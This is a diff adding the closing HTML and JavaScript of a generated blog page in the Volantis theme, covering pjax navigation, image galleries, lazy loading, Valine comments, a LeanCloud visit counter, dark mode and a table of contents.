+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    var valine = new Valine();
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":null,"appKey":null,"meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+      el: '#valine_container',
+      path: path,
+      placeholder: pagePlaceholder,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps,
+    }))
+  }
+  $(function () {
+    pjax_valine();
+  });
+  volantis.pjax.push(pjax_valine);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/baidu.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    const BAIDU_API_ID = "";
+    customSearch = new BaiduSearch({
+      apiId: BAIDU_API_ID,
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'http://example.com' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
